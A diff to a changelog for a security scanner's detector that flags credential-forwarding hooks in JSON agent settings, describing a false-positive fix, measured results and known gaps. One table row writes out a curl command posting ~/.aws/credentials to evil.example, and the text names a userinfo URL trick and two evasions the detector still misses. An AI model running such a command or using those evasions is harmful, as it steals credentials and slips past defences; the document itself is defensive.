@@ -96,6 +96,40 @@ is the #513 rating-design question, which is deferred with its own record; this 
 and decides nothing. The ratings, compliance numbers and exit codes are byte-identical on a
 fully readable tree, and the SARIF / HTML / ASP benchmark channels still carry no unread record
 — stated so the gap is on the record rather than silent.
+### Credential forwarding no longer fires on inert URLs in JSON, and names what it matched (#541, #403, #559)
+
+`secure` reported CRITICAL "Credential Forwarding Detected" on JSON that forwards nothing: a
+`$schema` pointer beside empty `SessionStart`/`PostToolUse` hooks (#541), and a plain repository
+URL in a curated-package data file (#403). The indirect detector paired a credential-word
+substring and a transmit-verb substring found anywhere in the artifact. In JSON those come from
+object keys (`SessionStart` supplied "session", `PostToolUse` supplied "post") and from unrelated
+values in separate records, and the blank-line co-location gate the detector relied on is inert on
+JSON, so the first URL in the file (the `$schema` line) was reported as the destination.
+
+For structured (JSON) artifacts the detector now pairs a credential term, a transmit verb and the
+destination URL only when all three occupy one leaf string value, with object keys excluded and a
+`command` field read together with its `args` array as one command line. The finding names the
+three tokens it matched, each with its line, and reports the destination as the URL origin
+(`scheme://host`) resolved with a real URL parser, so a userinfo prefix such as
+`https://api.stripe.com'@evil.example/x` is reported as its real host `evil.example` and a path or
+query that carries a token is not reproduced in the report.
+
+Measured on `8c767f6` (0.32.0) versus this release, `secure <dir> --json` with an isolated `HOME`:
+
+| target | 0.32.0 | this release |
+|---|---|---|
+| a `$schema` beside empty `SessionStart`/`PostToolUse` hooks (#541) | CRITICAL `settings.json:2`, 69/100 | no credential finding, 98/100 |
+| a repository URL in `curated-official-opena2a.json` (#403) | CRITICAL `:12`, 69/100 | no credential finding, 98/100 |
+| a real `curl -X POST https://evil.example/x -d @~/.aws/credentials` hook | CRITICAL at the `$schema` line (`:2`), destination "external endpoint" | CRITICAL at the command line (`:9`), destination `https://evil.example` |
+
+#559: the external-transmission evidence span no longer truncates a `.com` host to `.co` (the
+alternation matched `co` first) and no longer runs a JSON-embedded URL into the following keys; it
+is bounded to one leaf and, for the destination shown to the reader, resolved to an origin.
+
+Known residuals, not closed here: an exfiltration hook disguised inside a taxonomy-schema JSON is
+still suppressed by the taxonomy carve-out (pre-existing, unchanged by this fix; tracked in #569).
+The leaf-scoping is a deliberate trade: a forwarding hook that splits the credential path into an
+`env` value and the transmit verb and URL into the `command` is a false negative, tracked in #571.
 
 ### `secure --fail-below` settles once, on every channel, and only ever raises the exit code
 
@@ -194,6 +228,7 @@ in #560.
 
 `buildVerdict` is exported from `@opena2a/cli-ui` (pinned `0.5.2`), so the clause is composed
 in `hackmyagent` rather than in the renderer — no cross-package release.
+
 
 ### The ARP re-export now delivers opt-in telemetry
 
